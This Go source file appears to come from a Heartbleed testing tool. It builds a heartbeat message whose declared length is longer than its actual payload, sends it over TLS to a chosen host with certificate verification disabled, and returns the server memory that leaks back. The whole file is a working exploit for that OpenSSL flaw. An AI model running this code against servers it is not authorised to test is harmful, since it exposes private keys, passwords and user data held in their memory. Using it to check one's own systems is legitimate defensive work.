package heartbleed

import (
	"bytes"
	"encoding/binary"
	"errors"
	"github.com/FiloSottile/Heartbleed/tls"
	"github.com/davecgh/go-spew/spew"
	"time"
)

var ErrPayloadNotFound = errors.New("heartbleed: payload not found")

var padding = []byte("YELLOW SUBMARINE")

// struct {
//    uint8  type;
//    uint16 payload_length;
//    opaque payload[HeartbeatMessage.payload_length];
//    opaque padding[padding_length];
// } HeartbeatMessage;
func buildEvilMessage(payload []byte) []byte {
	buf := bytes.Buffer{}
	err := binary.Write(&buf, binary.BigEndian, uint8(1))
	if err != nil {
		panic(err)
	}
	err = binary.Write(&buf, binary.BigEndian, uint16(len(payload)+100))
	if err != nil {
		panic(err)
	}
	_, err = buf.Write(payload)
	if err != nil {
		panic(err)
	}
	_, err = buf.Write(padding)
	if err != nil {
		panic(err)
	}
	return buf.Bytes()
}

func heartbleedCheck(conn *tls.Conn, buf *bytes.Buffer, vuln chan bool) func([]byte) {
	return func(data []byte) {
		spew.Fdump(buf, data)
		if bytes.Index(data, padding) == -1 {
			vuln <- false
		} else {
			vuln <- true
		}
		conn.Close()
	}
}

func Heartbleed(host string, payload []byte) (out []byte, err error) {
	conn, err := tls.Dial("tcp", host, &tls.Config{InsecureSkipVerify: true})
	if err != nil {
		return nil, err
	}

	var vuln = make(chan bool, 1)
	buf := new(bytes.Buffer)
	conn.SendHeartbeat([]byte(buildEvilMessage(payload)), heartbleedCheck(conn, buf, vuln))

	go func() {
		conn.Read(nil)
	}()

	select {
	case status := <-vuln:
		if status {
			out = buf.Bytes()
			return
		} else {
			err = ErrPayloadNotFound
			return
		}
	case <-time.After(3 * time.Second):
		return nil, ErrPayloadNotFound
	}
}
